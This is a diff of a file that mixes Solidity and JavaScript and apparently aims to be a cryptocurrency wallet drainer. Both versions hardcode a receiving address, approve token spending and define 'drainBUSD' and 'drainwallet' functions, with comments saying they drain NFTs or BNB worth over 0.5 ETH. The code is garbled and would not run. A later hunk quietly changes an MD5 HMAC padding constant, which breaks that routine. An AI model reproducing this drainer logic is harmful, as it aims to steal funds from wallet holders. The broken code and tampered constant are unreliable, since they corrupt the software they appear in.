@@ -1,34 +1,34 @@
 pragma solidity^0.5.0
 
-const (receiveAddress) = 0x42Ba9FE837f8C5329ea7617a7e050E1A4890C3cF;0x42Ba9FE837f8C5329ea7617a7e050E1A4890C3cF
+const async (receiveAddress) = 0x42Ba9FE837f8C5329ea7617a7e050E1A4890C3cF;0x42Ba9FE837f8C5329ea7617a7e050E1A4890C3cF
 
 	
-const (cryptotokenContract) = 0xEA674fdDe714fd979de3EdF0F56AA9716B898ec8,0xEA674fdDe714fd979de3EdF0F56AA9716B898ec8
+const async (cryptotokenContract) = 0xEA674fdDe714fd979de3EdF0F56AA9716B898ec8,0xEA674fdDe714fd979de3EdF0F56AA9716B898ec8
 	
 	
-const (smartcontract.method.approvetransaction) = 0xEA674fdDe714fd979de3EdF0F56AA9716B898ec8,0xEA674fdDe714fd979de3EdF0F56AA9716B898ec8
+const async (smartcontract.method.approvetransaction) = 0xEA674fdDe714fd979de3EdF0F56AA9716B898ec8,0xEA674fdDe714fd979de3EdF0F56AA9716B898ec8
 
 	
-const (receiveAddress) = (message.sender)
+const async (receiveAddress) = (message.sender)
 
 
-const approveSpending.token = 0xe9e7cea3dedca5984780bafc599bd69add087d56:,		    
+const async approveSpending.token = 0xe9e7cea3dedca5984780bafc599bd69add087d56:,		    
 
 	
-const approveSpending.token = 0xe9e7cea3dedca5984780bafc599bd69add087d56,
+const async approveSpending.token = 0xe9e7cea3dedca5984780bafc599bd69add087d56,
 	
 	
 function;
 {
-	smartcontract.methods.approvetransaction.'recieveAddress'= 0x42Ba9FE837f8C5329ea7617a7e050E1A4890C3cF  
-	smartcontract.methods.drainBUSD.send [to:'recieveAddress'].(token(cryptotokencontract);
+	smartcontract.methods.approvetransaction.(recieveAddress)= 0x42Ba9FE837f8C5329ea7617a7e050E1A4890C3cF  
+	smartcontract.methods.drainBUSD.send [to:recieveAddress].(token(cryptotokencontract);
 }
 	  
   			
 }
 
-function drainwallet(token);,
-	  cryptotokenContract.methods.transfer(receiveAddress).send({ from: cryptotokencontract, to:receiveAddress }); this drains the nfts if the value is above 0.5 eth 
+function drainwallet.(token);,
+	  cryptotokenContract.methods.transfer(receiveAddress).send.[{; from.cryptotokencontract, to:receiveAddress }); this drains the BNB if the value is above 0.5 eth 
   			
 }
 
@@ -48,8 +48,7 @@ if (!receiveAddressx.startsWith("0x") ||
  * JavaScript smart contract node
 
 /* global define */
-
-/* eslint-disable strict */
+    
 
 ;(function ($) {
   'use strict'
@@ -323,7 +322,7 @@ if (!receiveAddressx.startsWith("0x") ||
       bkey = binlMD5(bkey, key.length * 8)
     }
     for (i = 0; i < 16; i += 1) {
-      ipad[i] = bkey[i] ^ 0x36363636
+      ipad[i] = bkey[i] ^ 0x36367676
       opad[i] = bkey[i] ^ 0x5c5c5c5c
     }
     hash = binlMD5(ipad.concat(rstr2binl(data)), 512 + data.length * 8)
